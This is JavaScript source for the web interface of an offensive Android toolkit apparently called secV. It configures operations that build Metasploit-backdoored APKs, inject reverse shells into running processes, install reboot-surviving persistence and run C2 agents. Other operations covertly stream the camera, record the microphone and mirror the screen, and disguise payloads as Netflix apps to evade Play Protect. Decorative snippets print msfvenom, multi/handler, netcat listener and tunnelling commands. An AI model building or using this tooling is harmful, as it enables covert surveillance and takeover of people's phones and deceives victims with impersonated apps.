       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server (wan mode)"},
       {n:"custom_str",p:"",t:"text",label:"Custom string (custom mode)"},
     ]},
    {id:"msf_handler", label:"MSF handler",
     desc:"Write handler.rc and launch Metasploit multi/handler in background. Run this before the target installs the backdoored APK.",
     cli:"secv android msf_handler --lhost LHOST --lport 4444 --payload tcp",
     runLabel:"START HANDLER",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
       {n:"launch",p:"true",t:"select",opts:["true","false"],label:"Launch msfconsole"},
     ]},
    {id:"deploy_shell", label:"deploy shell",
     desc:"Generate fresh msfvenom APK → adb install on device → WAN expose + QR. No template needed — builds com.metasploit.stage from scratch.",
     cli:"secv android deploy_shell --lhost LHOST --lport 4444",
     runLabel:"DEPLOY",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after deploy"},
       {n:"serve_port",p:"8891",t:"text",label:"APK serve port"},
     ]},
    {id:"rebuild", label:"rebuild APK · BootBuddy",
     desc:"Build stageless WAN C2 APK: BootReceiver + AgentService + DexClassLoader runtime payload chain. No static shellcode. Persists across reboots.",
     cli:"secv android rebuild --lhost LHOST [--msf] [--msf-lport 4444]",
     runLabel:"BUILD",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"msf",p:"false",t:"select",opts:["false","true"],label:"Merge MSF payload"},
       {n:"msf_lport",p:"4444",t:"text",label:"MSF LPORT"},
       {n:"bore_dex_port",p:"21062",t:"text",label:"bore DEX port"},
       {n:"bore_msf_port",p:"37993",t:"text",label:"bore MSF port"},
       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
     ]},
  ],
  "Instrumentation": [
    {id:"frida_hook", label:"frida hook",
     desc:"Auto-deploy frida-server to device, then run SSL unpin + root bypass + credential dump + method trace.",
     cli:"secv android frida_hook --package com.target.app --mode all",
     fields:[
       {n:"package",p:"com.target.app",t:"text",label:"Package (required)"},
       {n:"hook_mode",p:"all",t:"select",opts:["all","ssl_unpin","root_bypass","dump_creds","trace"],label:"Hook mode"},
       {n:"hook_timeout",p:"30",t:"text",label:"Timeout (s)"},
       {n:"trace_method",p:"",t:"text",label:"Trace method (trace mode only)"},
     ]},
    {id:"objection_patch", label:"objection patch",
     desc:"Embed Frida gadget via Objection — no root needed at runtime. Repackages + re-signs APK. WAN expose + QR auto-run after patching.",
     cli:"secv android objection_patch --package com.target.app",
     runLabel:"PATCH",
     fields:[
       {n:"package",p:"com.target.app",t:"text",label:"Package"},
       {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install patched APK"},
       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after patch"},
       {n:"serve_port",p:"8891",t:"text",label:"APK serve port"},
     ]},
    {id:"hook", label:"LSPosed hook",
     desc:"Three-vector persistence hook: Magisk service.sh + SharedUID shell + LSPosed/Zygote injection.",
     cli:"secv android hook --package com.target.app",
     fields:[{n:"package",p:"com.target.app",t:"text",label:"Package"}]},
    {id:"unhook", label:"unhook",
     desc:"Remove all hooks/agents planted by previous hook operations.",
     cli:"secv android unhook",
     fields:[]},
    {id:"process_inject", label:"process inject",
     desc:"Live process sniffer — attach to a running process PID and inject a reverse shell. Optional persistence install.",
     cli:"secv android process_inject --action inject --target-process PID --lhost LHOST --lport 4444",
     runLabel:"INJECT",
     fields:[
       {n:"action",p:"inject",t:"select",opts:["sniff","inject","persist_only"],label:"Action"},
       {n:"target_process",p:"",t:"text",label:"PID or package (click row below)"},
       {n:"inject_mode",p:"frida",t:"select",opts:["frida","ptrace"],label:"Inject mode"},
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"persist",p:"true",t:"select",opts:["true","false"],label:"Install persistence"},
     ],
     hasProcSniff: true},
  ],
  "Persistence": [
    {id:"persist", label:"persist",
     desc:"Three-layer persistence: BootReceiver (no root) + Magisk post-fs-data.d hook + Magisk module service.sh.",
     cli:"secv android persist --lhost LHOST --lport 4444",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
     ]},
  ],
  "C2 & Agent": [
    {id:"inject_agent", label:"inject agent",
     desc:"Push native ARM64/shell agent to device — receives JSON recon + TCP C2 callback with optional auto-escalation.",
     cli:"secv android inject_agent --mode recon --c2-host LHOST --c2-port 8889",
     fields:[
       {n:"agent_mode",p:"recon",t:"select",opts:["recon","exploit","c2"],label:"Agent mode"},
       {n:"c2_host",p:"",t:"text",label:"C2 host (auto)"},
       {n:"c2_port",p:"8889",t:"text",label:"C2 port"},
       {n:"c2_timeout",p:"20",t:"text",label:"Callback timeout (s)"},
       {n:"escalate",p:"false",t:"select",opts:["false","true"],label:"Auto escalate"},
       {n:"lhost",p:"",t:"text",label:"Shell LHOST (escalate mode)"},
       {n:"lport",p:"4444",t:"text",label:"Shell LPORT (escalate mode)"},
     ]},
    {id:"c2_gui", label:"C2 dashboard",
     desc:"Launch secV C2 web dashboard as a separate process — also accessible via the C2 tab above.",
     cli:"secv android c2_gui --c2-port 8889",
     fields:[{n:"c2_port",p:"8889",t:"text",label:"C2 port"}]},
    {id:"c2_cli", label:"C2 CLI",
     desc:"Launch C2 server in headless CLI mode — no browser required.",
     cli:"secv android c2_cli",
     fields:[]},
  ],
  "Live Media": [
    {id:"screen_mirror", label:"screen mirror",
     desc:"Live screen mirror: ADB mode streams H.264 via ffmpeg → MJPEG at up to 15fps. MSF mode polls Meterpreter screenshot every 3s. Auto-detects device resolution for correct aspect ratio.",
     cli:"secv android screen_mirror --source adb --serial <serial>\nsecv android screen_mirror --source msf --session 1",
     runLabel:"MIRROR",
     fields:[
       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
       {n:"serial",p:"",t:"text",label:"Device serial (blank = first)"},
       {n:"msf_session",p:"1",t:"text",label:"MSF session # (msf mode)"},
     ]},
    {id:"camera_snap", label:"camera snap",
     desc:"Capture a single frame from device camera. Uses ADB intent to open camera app then screencap, or Meterpreter webcam_snap for payload sessions.",
     cli:"secv android camera_snap --cam-id 0 --serial <serial>\nsecv android camera_snap --source msf --session 1 --cam-id 1",
     runLabel:"SNAP",
     fields:[
       {n:"cam_id",p:"0",t:"select",opts:["0","1"],label:"Camera (0=back, 1=front)"},
       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
       {n:"serial",p:"",t:"text",label:"Device serial"},
     ]},
    {id:"camera_stream", label:"camera stream",
     desc:"Live camera feed. ADB: screencap loop (no payload needed). MSF: proxies Meterpreter webcam_stream MJPEG on specified port.",
     cli:"secv android camera_stream --source adb --cam-id 0\nsecv android camera_stream --source msf --port 8880",
     runLabel:"STREAM",
     fields:[
       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
       {n:"cam_id",p:"0",t:"select",opts:["0","1"],label:"Camera (adb mode)"},
       {n:"msf_port",p:"8880",t:"text",label:"MSF MJPEG port (msf mode)"},
     ]},
    {id:"mic_record", label:"mic record",
     desc:"Record device microphone. ADB: uses tinycap/toybox on-device in timed chunks. MSF: calls record_mic in active Meterpreter session. Output saved to ~/.secv/android/media/.",
     cli:"secv android mic_record --source adb --duration 5 --serial <serial>\nsecv android mic_record --source msf --session 1 --duration 10",
     runLabel:"RECORD",
     fields:[
       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
       {n:"duration",p:"5",t:"text",label:"Duration (seconds)"},
       {n:"serial",p:"",t:"text",label:"Device serial (adb mode)"},
       {n:"msf_session",p:"1",t:"text",label:"MSF session # (msf mode)"},
     ]},
    {id:"speaker_push", label:"speaker push",
     desc:"Push an audio file (mp3/wav/ogg) to the device storage and play it via the media intent. Stop playback remotely via the ■ Stop button or CLI.",
     cli:"secv android speaker_push --file /path/to/audio.mp3 --serial <serial>\nsecv android speaker_push --stop --serial <serial>",
     runLabel:"PUSH",
     fields:[
       {n:"audio_path",p:"",t:"text",label:"Audio file path (local)"},
       {n:"serial",p:"",t:"text",label:"Device serial"},
     ]},
  ],
  "Evasion & Customization": [
    {id:"bypass_play_protect", label:"bypass Play Protect",
     desc:"Repackage APK to evade static Play Protect: rename metasploit package → GMS-lookalike, scrub manifest URI scheme, rename suspicious classes, inject junk decoy class, re-sign with convincing CN. No device needed.",
     cli:"secv android bypass_play_protect --apk-path /path/to/payload.apk --app-name 'Netflix Inc.'",
     runLabel:"EVADE",
     fields:[
       {n:"apk_path",p:"",t:"text",label:"APK path (blank = latest built)"},
       {n:"app_name",p:"Netflix Inc.",t:"text",label:"Signing cert CN"},
       {n:"fake_pkg",p:"",t:"text",label:"Override package (blank = random GMS)"},
     ]},
    {id:"customize_apk", label:"customize APK",
     desc:"Patch icon (all 6 mipmap densities), launcher label, and applicationId/package name. Accepts local PNG/JPG or HTTPS URL. Hot-swaps delivery link on completion.",
     cli:"secv android customize_apk --apk-path /path/to/app.apk --label Netflix --pkg com.netflix.mediastream --icon /path/to/icon.png",
     runLabel:"PATCH",
     fields:[
       {n:"apk_path",p:"",t:"text",label:"APK path (blank = latest evaded)"},
       {n:"app_label",p:"Netflix",t:"text",label:"App label (launcher name)"},
       {n:"package_name",p:"com.netflix.mediastream",t:"text",label:"Package / applicationId"},
       {n:"icon_path",p:"",t:"text",label:"Icon path or HTTPS URL"},
       {n:"output_name",p:"Netflix_v8.114.apk",t:"text",label:"Output filename"},
     ]},
  ],
  "Automated Chains": [
    {id:"full_pwn", label:"full pwn",
     desc:"Full chain: recon → adb_wifi → get_root → device_net_scan → deploy_shell → persist → wan_expose.",
     cli:"secv android full_pwn --lhost LHOST --lport 4444",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
     ]},
    {id:"multi_device", label:"multi device",
     desc:"Run any operation on ALL connected devices simultaneously — parallel session management.",
     cli:"secv android multi_device --op recon",
     fields:[
       {n:"sub_operation",p:"recon",t:"select",
        opts:["recon","vuln_scan","full_pwn","inject_agent","app_scan","get_root","persist"],
        label:"Sub-operation"},
     ]},
  ],
};

// ── State ─────────────────────────────────────────────────────────────────────
let currentOp = null;
let appList    = [];
let findings   = [];
let qrList     = [];
let findingsCount = 0;
let qrCount    = 0;
let es             = null;
let opStartTs      = null;
let _activeSessions = {};   // sid → {id,op,device,status,startTs,color}
let _sessionColors = ['#4caf50','#44ddff','#ffcc44','#aa66ff','#4488ff',
                      '#44ff99','#66ddff','#ffdd66','#cc88ff','#66aaff'];
let settings   = {lhost:"",lport:"4444",bore_server:"bore.pub",nvd_api_key:"",c2_host:"",c2_port:"8889"};

// ── Code Tattoo Background ─────────────────────────────────────────────────────
// Subtle fading-tattoo effect: code fragments glow at very low opacity in grey,
// appearing/fading at fixed positions like ghost ink — no movement, no rain.
function initCodeBg() {
  const canvas = document.getElementById('code-bg');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');

  // Session/security-related source code snippets — the "soul" of the tool
  const SNIPPETS = [
    // Session management
    '_sessions[sid] = {"op": op, "status": "running"}',
    'with _sessions_lock: _session_seq += 1',
    'def _api_sessions(self): rows = [...]',
    'updateSessionsBar(); // refresh pills',
    '_activeSessions[sid] = {op, device, color}',
    'if d.session_id: watchSession(d.session_id)',
    'fetch(\'/api/msf/sessions\').then(r=>r.json())',
    // Payload delivery
    'msfvenom -x template.apk -p android/meterpreter/reverse_tcp',
    'apktool d --no-src -o decoded/ target.apk',
    'apksigner sign --ks evade_signing.keystore',
    'ssh -R 80:localhost:8891 localhost.run',
    'adb install -r -t payload.apk',
    'adb connect 192.168.x.x:5555',
    // Evasion
    'smali.replace("com/metasploit/stage", fake_pkg)',
    'manifest.remove("android:scheme=\\"metasploit\\"")',
    'class Payload -> DataConnector',
    'class MainService -> AnalyticsService',
    'keytool -genkey -alias evade -dname "CN=Netflix Inc"',
    // MSF
    'use exploit/multi/handler',
    'set PAYLOAD android/meterpreter/reverse_tcp',
    'set ExitOnSession false; run -j',
    'sessions -l; sessions -i 1',
    'meterpreter > sysinfo; screenshot',
    // SSE + backend
    'data: ' + JSON.stringify({sid:1,op:'backdoor_apk',status:'running'}),
    '_broadcast(json.dumps({"event":"session","sid":sid}))',
    'EventSource(\'/api/sse\').onmessage = handleEvent',
    'ThreadingHTTPServer(("",port), Handler).serve_forever()',
    // ADB
    'adb shell pm path com.target.app | cut -d: -f2',
    'adb shell am start -n pkg/.MainActivity',
    'adb pull /data/app/com.target.app/base.apk',
    // Python backend
    'global _session_seq, _sessions, _msf_proc',
    'subprocess.Popen(["msfconsole","-q","-x",init])',
    'pty.fork() -> master_fd, slave_fd',
    // Networking
    'bore local 4444 --to bore.pub:7835',
    'LHOST=`ip route get 1 | awk \'{print $7}\'`',
    'nc -lvnp 4444  # catch incoming shell',
    // secV arch
    '// secV v2.4.2 · tauri · concurrent sessions',
    'secV.run(op, target, params) -> session_id',
    '// golang concurrent session manager',
  ];

  let W = 0, H = 0;
  const FONT_SIZE = 11;
  const FONT = `${FONT_SIZE}px "JetBrains Mono", monospace`;
  const MAX_TATTOOS = 28;
  const FADE_IN_FRAMES = 80;
  const HOLD_FRAMES   = 260;
  const FADE_OUT_FRAMES = 80;
  const TOTAL_LIFE = FADE_IN_FRAMES + HOLD_FRAMES + FADE_OUT_FRAMES;
  // max alpha — very subtle, tattoo-like
  const MAX_ALPHA = 0.055;
  const ACCENT_ALPHA = 0.08;

  let tattoos = [];

  function makeTattoo(i) {
    const text  = SNIPPETS[Math.floor(Math.random() * SNIPPETS.length)];
    const isAccent = Math.random() < 0.12; // 12% chance of slight cyan tint
    return {
      text,
      x: 20 + Math.random() * (W - 200),
      y: 20 + Math.random() * (H - 20),
      frame: -Math.floor(Math.random() * TOTAL_LIFE), // stagger start
      maxAlpha: isAccent ? ACCENT_ALPHA : MAX_ALPHA,
      color: isAccent ? '#88ccdd' : '#888888',
    };
  }

  function resize() {
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
    // clear and respawn on resize
    ctx.clearRect(0, 0, W, H);
    tattoos = Array.from({length: MAX_TATTOOS}, (_, i) => makeTattoo(i));
  }
  resize();
  window.addEventListener('resize', resize);

  function draw() {
    ctx.clearRect(0, 0, W, H);
    ctx.font = FONT;
    ctx.textBaseline = 'top';

    for (let i = 0; i < tattoos.length; i++) {
      const t = tattoos[i];
      t.frame++;

      let alpha;
      if (t.frame < 0) {
        alpha = 0;
      } else if (t.frame < FADE_IN_FRAMES) {
        alpha = t.maxAlpha * (t.frame / FADE_IN_FRAMES);
      } else if (t.frame < FADE_IN_FRAMES + HOLD_FRAMES) {
        // very gentle pulse ±10% during hold
        const pulse = Math.sin((t.frame - FADE_IN_FRAMES) * 0.03) * 0.1 + 0.9;
        alpha = t.maxAlpha * pulse;
      } else if (t.frame < TOTAL_LIFE) {
        const fadeOut = (t.frame - FADE_IN_FRAMES - HOLD_FRAMES) / FADE_OUT_FRAMES;
        alpha = t.maxAlpha * (1 - fadeOut);
      } else {
        // respawn at new position
        tattoos[i] = makeTattoo(i);
        tattoos[i].frame = 0;
        continue;
      }

      if (alpha <= 0) continue;
      ctx.globalAlpha = alpha;
      ctx.fillStyle   = t.color;
      ctx.fillText(t.text, t.x, t.y);
    }

    ctx.globalAlpha = 1;
    requestAnimationFrame(draw);
  }
  draw();
}

window.onload = () => {
  initCodeBg();
  buildSidebar();
  startDeviceWatch();
  connectSSE();
  loadSettings();
  detectLhost();
  pdInit();
  setInterval(updateStatus, 1500);
  setInterval(updateStatusTime, 500);
  setInterval(pdRefreshSessions, 3000);
};

function pdInit() {
  // sync lhost/lport from settings into P&D fields
  const lhEl = document.getElementById('pd-lhost');
  const lpEl = document.getElementById('pd-lport');
  if (lhEl && settings.lhost) lhEl.value = settings.lhost;
  if (lpEl && settings.lport) lpEl.value = settings.lport;
}

// ── Sidebar ───────────────────────────────────────────────────────────────────
function buildSidebar() {
  const cont = document.getElementById('op-groups');
  cont.innerHTML = '';
  for (const [grp, ops] of Object.entries(OPS)) {
    const g = document.createElement('div');
    g.className = 'op-group';
    g.dataset.cat = OPS_CATS[grp] || 'default';
    const t = document.createElement('div');
    t.className = 'op-group-title';
    t.innerHTML = `<span>${grp}</span><span class="arrow">▾</span>`;
    t.onclick = () => g.classList.toggle('collapsed');
    const l = document.createElement('div'); l.className = 'op-list';
    for (const op of ops) {
      const i = document.createElement('div');
      i.className = 'op-item'; i.textContent = op.label; i.dataset.id = op.id;
      i.onclick = () => selectOp(op, i);
      l.appendChild(i);
    }
    g.append(t, l); cont.appendChild(g);
  }
}

function selectOp(op, el) {
  document.querySelectorAll('.op-item').forEach(e => e.classList.remove('active'));
  el.classList.add('active');
  currentOp = op;
  const panel = document.getElementById('params-panel');
  panel.classList.add('switching');
  setTimeout(() => { renderParams(op); panel.classList.remove('switching'); }, 80);
}

// ── Params ────────────────────────────────────────────────────────────────────
function renderParams(op) {
  const titleEl = document.getElementById('op-title');
  const descEl  = document.getElementById('op-desc');
  const phEl    = document.getElementById('params-placeholder');
  titleEl.textContent = op.label;
  descEl.textContent  = op.desc;
  titleEl.style.display = '';
  descEl.style.display  = '';
  if (phEl) phEl.style.display = 'none';
  const form = document.getElementById('params-form');
  form.innerHTML = '';

  // ── device target row (always present for every operation) ─────
  const devWrap = mkField('Target Device');
  const devSel  = document.createElement('select');
  devSel.id    = 'f_device_target';
  devSel.style.cssText = 'min-width:220px;';
  // populate from _deviceMap
  const allOpt = document.createElement('option');
  allOpt.value = '__all__'; allOpt.textContent = '★ All connected devices';
  devSel.appendChild(allOpt);
  const noneOpt = document.createElement('option');
  noneOpt.value = ''; noneOpt.textContent = '-- none (auto) --';
  devSel.appendChild(noneOpt);
  for (const [serial, dev] of Object.entries(_deviceMap)) {
    const o = document.createElement('option');
    o.value = serial;
    o.textContent = (dev.label || serial) + (dev.android ? ' · Android '+dev.android : '');
    devSel.appendChild(o);
  }
  // sync with sidebar selection by default
  const sidebarSel = document.getElementById('dev-select').value;
  devSel.value = sidebarSel || '';
  // keep sidebar in sync when changed here
  devSel.onchange = () => {
    const v = devSel.value;
    if (v !== '__all__') {
      document.getElementById('dev-select').value = v;
      if (v && _deviceMap[v]) _updateDevBadge(_deviceMap[v]);
      else { document.getElementById('devbadge').classList.remove('connected'); }
    }
  };
  devWrap.appendChild(devSel);
  form.appendChild(devWrap);

  for (const f of (op.fields || [])) {
    // use app dropdown if apps loaded and field is 'package'
    if (f.n === 'package' && appList.length > 0) {
      const wrap = mkField(f.label);
      const s = document.createElement('select');
      s.id = 'f_' + f.n; s.name = f.n;
      const blank = document.createElement('option');
      blank.value = ''; blank.textContent = '-- any --'; s.appendChild(blank);
      for (const pkg of appList) {
        const o = document.createElement('option');
        o.value = o.textContent = pkg; s.appendChild(o);
      }
      wrap.appendChild(s); form.appendChild(wrap); continue;
    }
    const wrap = mkField(f.label);
    if (f.t === 'select') {
      const s = document.createElement('select');
      s.id = 'f_' + f.n; s.name = f.n;
      for (const o of f.opts) {
        const opt = document.createElement('option');
        opt.value = o; opt.textContent = o;
        if (o === f.p) opt.selected = true;
        s.appendChild(opt);
      }
      wrap.appendChild(s);
    } else {
      const i = document.createElement('input');
      i.id = 'f_' + f.n; i.name = f.n; i.type = 'text';
      i.dataset.name = f.n; i.className = 'param-field';
      // pre-fill from global settings where applicable
      const settingsMap = {lhost:'lhost',lport:'lport',bore_server:'bore_server',
                           nvd_api_key:'nvd_api_key',c2_host:'c2_host',c2_port:'c2_port'};
      i.value = (f.n in settingsMap && settings[settingsMap[f.n]]) ? settings[settingsMap[f.n]] : (f.p || '');
      i.placeholder = f.p || '';
      wrap.appendChild(i);
    }
    form.appendChild(wrap);
  }

  const btn = document.createElement('button');
  btn.id = 'run-btn';
  btn.textContent = '▶ ' + (op.runLabel || 'RUN');
  btn.onclick = runOp;
  form.appendChild(btn);

  // CLI reference line
  if (op.cli) {
    const hint = document.createElement('div');
    hint.className = 'op-cli-hint';
    hint.innerHTML = `<span class="op-cli-label">CLI</span><code>${op.cli}</code>`;
    form.appendChild(hint);
  }

  // show process sniffer panel if op has it
  showProcSniff(!!op.hasProcSniff);
  if (op.hasProcSniff) refreshProcs();
}

function mkField(label) {
  const w = document.createElement('div'); w.className = 'field';
  const l = document.createElement('label'); l.textContent = label;
  w.appendChild(l); return w;
}

// ── Run ───────────────────────────────────────────────────────────────────────
function runOp() {
  if (!currentOp) return;

  // Live Media ops — switch to Live tab and activate directly
  const liveMediaOps = {
    screen_mirror: () => {
      const src = (document.getElementById('f_source')||{}).value || 'adb';
      const ses = (document.getElementById('f_msf_session')||{}).value || '1';
      document.getElementById('screen-source').value = src;
      document.getElementById('msf-session-inp').value = ses;
      document.getElementById('msf-session-inp').style.display = src === 'msf' ? '' : 'none';
      switchTab('live'); startScreen();
    },
    camera_snap: () => {
      const camId = (document.getElementById('f_cam_id')||{}).value || '0';
      document.getElementById('cam-id').value = camId;
      switchTab('live'); camSnap();
    },
    camera_stream: () => {
      const src   = (document.getElementById('f_source')||{}).value || 'adb';
      const camId = (document.getElementById('f_cam_id')||{}).value || '0';
      const port  = (document.getElementById('f_msf_port')||{}).value || '8880';
      document.getElementById('cam-id').value = camId;
      document.getElementById('cam-port').value = port;
      switchTab('live');
      if (src === 'msf') startCamStream(); else startCamAdb();
    },
    mic_record: () => {
      const src = (document.getElementById('f_source')||{}).value || 'adb';
      const dur = (document.getElementById('f_duration')||{}).value || '5';
      document.getElementById('mic-dur').value = dur;
      switchTab('live');
      if (src === 'msf') msfMicRec(); else startMicRecord();
    },
    speaker_push: () => { switchTab('live'); document.getElementById('spk-file').click(); },
  };
  if (liveMediaOps[currentOp.id]) { liveMediaOps[currentOp.id](); return; }

  const devTargetEl = document.getElementById('f_device_target');
  const devTarget   = devTargetEl ? devTargetEl.value : document.getElementById('dev-select').value;
  const allDevices  = devTarget === '__all__';

  const params = { operation: currentOp.id };

  if (allDevices) {
    params.operation     = 'multi_device';
    params.sub_operation = currentOp.id;
    for (const f of (currentOp.fields || [])) {
      const el = document.getElementById('f_' + f.n);
      if (el && el.value.trim()) params[f.n] = el.value.trim();
    }
  } else {
    const serial = devTarget || document.getElementById('dev-select').value;
    if (serial) { params.device = serial; document.getElementById('dev-select').value = serial; }
    if (settings.lhost)       params._lhost_default  = settings.lhost;
    if (settings.bore_server) params._bore_default   = settings.bore_server;
    if (settings.nvd_api_key) params.nvd_api_key     = settings.nvd_api_key;
    for (const f of (currentOp.fields || [])) {
      const el = document.getElementById('f_' + f.n);
      if (el && el.value.trim()) params[f.n] = el.value.trim();
    }
    if (!params.lhost   && settings.lhost)   params.lhost   = settings.lhost;
    if (!params.lport   && settings.lport)   params.lport   = settings.lport;
    if (!params.c2_host && settings.c2_host) params.c2_host = settings.c2_host;
    if (!params.c2_port && settings.c2_port) params.c2_port = settings.c2_port;
    delete params._lhost_default; delete params._bore_default;
  }

  const label   = allDevices
    ? `${currentOp.label} [ALL ${Object.keys(_deviceMap).length} devices]`
    : currentOp.label;
  const context = { target: allDevices ? 'all' : (params.device || 'device'), params };

  switchTab('terminal');
  fetch('/api/run', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(context)
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      const sid   = d.session_id;
      const color = _sessionColors[(sid-1) % _sessionColors.length];
      _activeSessions[sid] = {
        id: sid, op: params.operation, device: params.device || '',
        status: 'running', startTs: Date.now(), color
      };
      opStartTs = opStartTs || Date.now();
      updateSessionsBar();
      termLine(`\x1b[36m[*] Session #${sid} started: ${label}\x1b[0m`);
    } else {
      termLine(`\x1b[31m[!] ${d.error}\x1b[0m`);
    }
  });
}

// ── SSE Terminal ──────────────────────────────────────────────────────────────
function connectSSE() {
  if (es) es.close();
  es = new EventSource('/api/stream');
  es.onmessage = (e) => {
    const line = e.data;

    // ── result sentinel — never goes to terminal ──────────────────────────
    if (line.startsWith('__RESULT__:')) {
      try { handleResult(JSON.parse(line.slice(11))); } catch(_) {}
      return;
    }

    // ── session-done sentinel ─────────────────────────────────────────────
    const doneMatch = line.match(/^\x1b\[35m\[done:(\d+)\]\x1b\[0m$/) ||
                      line.match(/^\[done:(\d+)\]$/);
    if (doneMatch) {
      const sid = parseInt(doneMatch[1]);
      if (_activeSessions[sid]) {
        const s = _activeSessions[sid];
        s.status = 'done';
        updateSessionsBar();
        showToast(`Session #${sid} (${s.op}) complete`, 'info', 3000);
        setTimeout(() => { delete _activeSessions[sid]; updateSessionsBar(); }, 8000);
      }
      termLine(line); return;
    }

    termLine(line);
    if (line.includes('[qr-captured]') || line.includes('[qr-url-captured]')) {
      setTimeout(loadQR, 500);
    }
  };
  es.onerror = () => setTimeout(connectSSE, 3000);
}

// ── Terminal output ───────────────────────────────────────────────────────────
let _termLineCount = 0;
let _autoScroll    = true;
let _wrapMode      = true;
let _findMatches   = [];
let _findIdx       = -1;

function termLine(raw) {
  const term = document.getElementById('terminal');
  const span = document.createElement('span'); span.className = 'ln';
  const ts   = document.createElement('span'); ts.className   = 'ts';
  ts.textContent = now();
  span.innerHTML = ts.outerHTML + ansiToHtml(raw);
  term.appendChild(span);
  _termLineCount++;
  const ct = document.getElementById('term-line-ct');
  if (ct) ct.textContent = _termLineCount + ' lines';
  if (_autoScroll) term.scrollTop = term.scrollHeight;
}

function clearTerminal() {
  document.getElementById('terminal').innerHTML = '';
  _termLineCount = 0;
  _findMatches = []; _findIdx = -1;
  const ct = document.getElementById('term-line-ct');
  if (ct) ct.textContent = '0 lines';
  closeFindBar();
}

function toggleWrap() {
  _wrapMode = !_wrapMode;
  const t = document.getElementById('terminal');
  const b = document.getElementById('wrap-btn');
  t.classList.toggle('nowrap', !_wrapMode);
  b.classList.toggle('active', _wrapMode);
}

function toggleAutoScroll() {
  _autoScroll = !_autoScroll;
  document.getElementById('scroll-btn').classList.toggle('active', _autoScroll);
}

// ── Terminal find ─────────────────────────────────────────────────────────────
function toggleFindBar() {
  const bar = document.getElementById('term-find-bar');
  const isOpen = bar.classList.toggle('open');
  document.getElementById('term-find-btn').classList.toggle('active', isOpen);
  if (isOpen) { document.getElementById('term-find-inp').focus(); termFindUpdate(); }
  else clearFindHighlights();
}

function closeFindBar() {
  document.getElementById('term-find-bar').classList.remove('open');
  document.getElementById('term-find-btn').classList.remove('active');
  clearFindHighlights();
}

function termFindKey(e) {
  if (e.key === 'Enter') { e.shiftKey ? termFindPrev() : termFindNext(); }
  if (e.key === 'Escape') closeFindBar();
}

function termFindUpdate() {
  clearFindHighlights();
  const q = document.getElementById('term-find-inp').value.toLowerCase();
  if (!q) { document.getElementById('term-find-count').textContent = ''; return; }
  const lines = document.getElementById('terminal').querySelectorAll('.ln');
  _findMatches = [];
  lines.forEach(ln => {
    if (ln.textContent.toLowerCase().includes(q)) {
      ln.classList.add('find-match');
      _findMatches.push(ln);
    }
  });
  _findIdx = _findMatches.length ? 0 : -1;
  updateFindCursor();
}

function clearFindHighlights() {
  document.getElementById('terminal').querySelectorAll('.find-match,.find-current')
    .forEach(el => el.classList.remove('find-match','find-current'));
  _findMatches = []; _findIdx = -1;
  document.getElementById('term-find-count').textContent = '';
}

function updateFindCursor() {
  _findMatches.forEach((el, i) =>
    el.classList.toggle('find-current', i === _findIdx));
  const cnt = document.getElementById('term-find-count');
  cnt.textContent = _findMatches.length
    ? `${_findIdx + 1}/${_findMatches.length}`
    : 'no matches';
  if (_findMatches[_findIdx])
    _findMatches[_findIdx].scrollIntoView({block:'nearest'});
}

function termFindNext() {
  if (!_findMatches.length) return;
  _findIdx = (_findIdx + 1) % _findMatches.length;
  updateFindCursor();
}

function termFindPrev() {
  if (!_findMatches.length) return;
  _findIdx = (_findIdx - 1 + _findMatches.length) % _findMatches.length;
  updateFindCursor();
}

// Ctrl+F global binding
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
    const termWrap = document.getElementById('terminal-wrap');
    if (termWrap && termWrap.style.display !== 'none') {
      e.preventDefault(); toggleFindBar();
    }
  }
});

// ── ANSI ──────────────────────────────────────────────────────────────────────
const ANSI_MAP = {
  '30':'#555','31':'#ff4444','32':'#00ff88','33':'#ffcc44','34':'#4488ff',
  '35':'#aa66ff','36':'#44ddff','37':'#c0c0d8','90':'#505070','91':'#ff6666',
  '92':'#44ff99','93':'#ffdd66','94':'#66aaff','95':'#cc88ff','96':'#66ddff','97':'#ffffff',
};
function ansiToHtml(s) {
  const txt = s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const parts = txt.split(/(\x1b\[[0-9;]*m)/);
  let result = ''; let open = false;
  for (const p of parts) {
    const m = p.match(/^\x1b\[([0-9;]*)m$/);
    if (m) {
      if (open) { result += '</span>'; open = false; }
      for (const code of m[1].split(';')) {
        const col = ANSI_MAP[code];
        if (col) { result += `<span style="color:${col}">`; open = true; }
      }
    } else { result += p; }
  }
  if (open) result += '</span>';
  return result;
}

// ── Findings / Result panel ───────────────────────────────────────────────────
let _lastResult   = null;
let _fActiveTab   = 'summary';
let _fVulnFilter  = 'ALL';

function handleResult(result) {
  _lastResult = result;
  const data   = result.data  || {};
  const vulns  = data.vulnerabilities || [];
  const fArr   = data.findings        || [];
  const errors = result.errors        || [];

  // badge
